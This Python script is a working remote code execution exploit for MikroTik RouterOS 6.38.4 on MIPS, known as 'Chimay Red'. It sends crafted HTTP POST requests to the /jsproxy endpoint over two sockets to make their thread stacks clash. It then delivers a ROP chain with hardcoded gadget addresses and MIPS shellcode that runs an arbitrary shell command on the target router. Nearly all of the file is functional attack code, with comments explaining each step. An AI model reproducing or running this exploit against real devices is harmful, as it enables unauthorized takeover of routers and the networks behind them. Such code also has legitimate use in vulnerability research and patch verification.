#!/usr/bin/env python3

# Mikrotik Chimay Red Stack Clash Exploit by BigNerd95

# Tested on RouterOS 6.38.4 (mipsbe) [using a CRS109]

# Used tools: pwndbg, rasm2, mipsrop for IDA

# ASLR enabled on libs only
# DEP NOT enabled

import socket, time, sys, struct

AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!

ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain

def makeHeader(num):
    return b"POST /jsproxy HTTP/1.1\r\nContent-Length: " + bytes(str(num), 'ascii') + b"\r\n\r\n"

def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("Error connecting to socket")
        sys.exit(-1)
    print("Connected")
    time.sleep(0.5)
    return s

def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("Error sending data")
        sys.exit(-1)
    print("Sent")
    time.sleep(0.5)

def build_shellcode(shellCmd):
    shell_code = b''
    shellCmd = bytes(shellCmd, "ascii")
    
    # Here the shellcode will write the arguments for execve: ["/bin/bash", "-c", "shellCmd", NULL] and [NULL]
    # XX XX XX XX  <-- here the shell code will write the address of string "/bin/bash"                           [shellcode_start_address -16]             <--- argv_array        
    # XX XX XX XX  <-- here the shell code will write the address of string "-c"                                  [shellcode_start_address -12]
    # XX XX XX XX  <-- here the shell code will write the address of string "shellCmd"                            [shellcode_start_address  -8]
    # XX XX XX XX  <-- here the shell code will write 0x00000000 (used as end of argv_array and as envp_array)    [shellcode_start_address  -4]             <--- envp_array        
    
    # The shell code execution starts here!
    shell_code += struct.pack('>L', 0x24500000)    # addiu s0, v0, 0           # s0 = v0                                                Save the shellcode_start_address in s0 (in v0 we have the address of the stack where the shellcode starts [<-- pointing to this location exactly]) 
    shell_code += struct.pack('>L', 0x26040040)    # addiu a0, s0, 0x40        # a0 = shellcode_start_address + 0x40                    Calculate the address of string "/bin/bash" and put it in a0 (the first parameter of execve) 
    shell_code += struct.pack('>L', 0xae04fff0)    # sw a0, -16(s0)            # shellcode_start_address[-16] = bin_bash_address        Write in the first entry of the "argv" array the address of the string "/bin/bash" 
    shell_code += struct.pack('>L', 0x26110050)    # addiu s1, s0, 0x50        # s1 = shellcode_start_address + 0x50                    Calculate the address of string "-c" and put it in s1 
    shell_code += struct.pack('>L', 0xae11fff4)    # sw s1, -12(s0)            # shellcode_start_address[-12] = c_address               Write in the second entry of the "argv" array the address of the string "-c" 
    shell_code += struct.pack('>L', 0x26110060)    # addiu s1, s0, 0x60        # s1 = shellcode_start_address + 0x60                    Calculate the address of string "shellCmd" and put it in s1  
    shell_code += struct.pack('>L', 0xae11fff8)    # sw s1, -8(s0)             # shellcode_start_address[-8]  = shellCmd_address        Write in the third entry of the "argv" array the address of the string "shellCmd" 
    shell_code += struct.pack('>L', 0xae00fffc)    # sw zero, -4(s0)           # shellcode_start_address[-4]  = 0x00                    Write NULL address as end of argv_array and envp_array
    shell_code += struct.pack('>L', 0x2205fff0)    # addi a1, s0, -16          # a1 = shellcode_start_address - 16                      Put the address of argv_array in a1 (the second parameter of execve)
    shell_code += struct.pack('>L', 0x2206fffc)    # addi a2, s0, -4           # a2 = shellcode_start_address - 4                       Put the address of envp_array in a2 (the third parameter of execve)
    shell_code += struct.pack('>L', 0x24020fab)    # addiu v0, zero, 0xfab     # v0 = 4011                                              Put the syscall number of execve (4011) in v0   (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h)
    shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start execve("/bin/bash", ["/bin/bash", "-c", "shellCmd", NULL], [NULL])
    
    shell_code += b'P' * (0x40 - len(shell_code))   # offset to simplify string address calculation  
    shell_code += b'/bin/bash\x00'                           # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x40]                 <--- bin_bash_address
    
    shell_code += b'P' * (0x50 - len(shell_code))   # offset to simplify string address calculation
    shell_code += b'-c\x00'                                  # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x50]                 <--- c_address
    
    shell_code += b'P' * (0x60 - len(shell_code))   # offset to simplify string address calculation
    shell_code += shellCmd + b'\x00'                         #                                                    [shellcode_start + 0x60]                 <--- shellCmd_address

    return shell_code

def build_payload(shellCmd):
    ropChain = b''
    shell_code = build_shellcode(shellCmd)
    
    # 1) Stack finder gadget (to make stack pivot) 
    ropChain += struct.pack('>L', 0x0040AE04)
    #                                            Action: addiu  $a0, $sp, 0x600 + var_5E8                      # a0 = stackpointer + 0x18
    #                                            Control Jump:  jr    0x600 + var_4($sp) 
    # This gadget (moreover) allows us to reserve 1512 bytes inside the rop chain 
    # to store the shellcode (beacuse of: jr 0x600 + var_4($sp))
    ropChain += b'B' * 0x18  # 0x600 - 0x5E8 = 0x18           (in the last 16 bytes of this offset the shell code will write the arguments for execve)
    ropChain += shell_code   # write the shell code in this "big" offset
    ropChain += b'C' * (0x600 - 0x18 - len(shell_code) - 0x4) # offset because of this: 0x600 + var_4($sp)


    # 2) Copy a0 in v0 because of next gadget
    ropChain += struct.pack('>L', 0x00414E58) 
    #                                           Gadget Action:   move $v0, $a0                                 # v0 = a0
    #                                           Gadget Control:  jr  0x28 + var_4($sp) 
    ropChain += b'D' * (0x28 - 0x4) # offset because of this: 0x28 + var_4($sp) 


    # 3) Jump to the stack (start shell code)
    ropChain += struct.pack('>L', 0x00412540)
    #                                           Gadget Action:   jalr $t9                                      # jump v0
    #                                           Gadget Control:  jalr  $v0    

    return ropChain

def stackClash(ip, port, payload):

    print("Opening 2 sockets")

    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, port) # socket 1, thread A
    s2 = makeSocket(ip, port) # socket 2, thread B

    print("Stack clash...")

    # 2) Stack Clash
    # 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)

    # 2.2) send some bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved

    # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
    socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned

    print("Sending payload")

    # 3) Send ROP chain and shell code
    socketSend(s1, payload)

    print("Starting exploit")

    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain

    print("Done!")

if __name__ == "__main__":
    if len(sys.argv) == 4:
        ip       = sys.argv[1]
        port     = int(sys.argv[2])
        shellCmd = sys.argv[3]

        payload = build_payload(shellCmd)

        stackClash(ip, port, payload)
    else:
        print("Usage: " + sys.argv[0] + " IP PORT shellcommand")
